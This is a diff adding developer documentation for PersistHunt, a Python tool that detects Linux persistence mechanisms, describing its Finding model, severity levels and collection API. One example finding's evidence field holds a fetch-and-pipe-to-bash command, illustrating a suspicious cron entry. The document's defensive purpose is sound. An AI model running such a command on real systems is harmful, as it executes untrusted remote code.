@@ -1,0 +1,76 @@
+# PersistHunt
+
+PersistHunt is a Linux persistence detection framework written in Python.
+
+## Developer Documentation
+
+### Stage 1: Finding Engine
+
+The finding engine provides a standardized representation for security findings. All future PersistHunt detection modules will use this engine to normalize findings across different persistence types (cron, systemd, SSH, etc.).
+
+#### Finding Model
+
+A `Finding` represents a single security issue detected on the system. It contains the following properties:
+
+- `id`: A unique identifier for the finding type (e.g., `PH-CRON-001`). Provided by the detector.
+- `category`: The security category (e.g., `cron`, `systemd`).
+- `severity`: The severity level, which must be one of the `Severity` enum values.
+- `title`: A short human-readable description.
+- `description`: A detailed explanation of why the finding was generated.
+- `evidence`: (Optional) Evidence causing the detection. Can be a string, structured dictionary, etc.
+- `location`: (Optional) The relevant filesystem location, service, or configuration file.
+- `recommendation`: (Optional) A remediation recommendation.
+
+#### Available Severity Levels
+
+The `Severity` enum provides a controlled set of severity levels:
+- `INFO`
+- `LOW`
+- `MEDIUM`
+- `HIGH`
+- `CRITICAL`
+
+#### Creating a Finding
+
+Detectors can create findings as follows:
+
+```python
+from persisthunt.findings import Finding, Severity
+
+finding = Finding(
+    id="PH-CRON-001",
+    category="cron",
+    severity=Severity.HIGH,
+    title="Suspicious cron entry",
+    description="A cron entry contains a suspicious command.",
+    evidence="curl http://example.com/a.sh | bash",
+    location="/etc/cron.d/example",
+    recommendation="Review and remove the unauthorized cron entry."
+)
+```
+
+#### Finding Collection and Serialization
+
+Findings are grouped into a `FindingCollection`, which provides methods for filtering and analyzing the findings:
+
+```python
+from persisthunt.findings import FindingCollection
+
+collection = FindingCollection()
+collection.add(finding)
+
+# Iterate findings
+for f in collection:
+    print(f.title)
+
+# Filter findings
+high_severity_findings = collection.by_severity(Severity.HIGH)
+cron_findings = collection.by_category("cron")
+
+# Get statistics
+counts = collection.severity_counts()
+print(counts) # {'INFO': 0, 'LOW': 0, 'MEDIUM': 0, 'HIGH': 1, 'CRITICAL': 0}
+
+# Serialize to dictionaries for JSON output
+dict_output = collection.to_dict()
+```
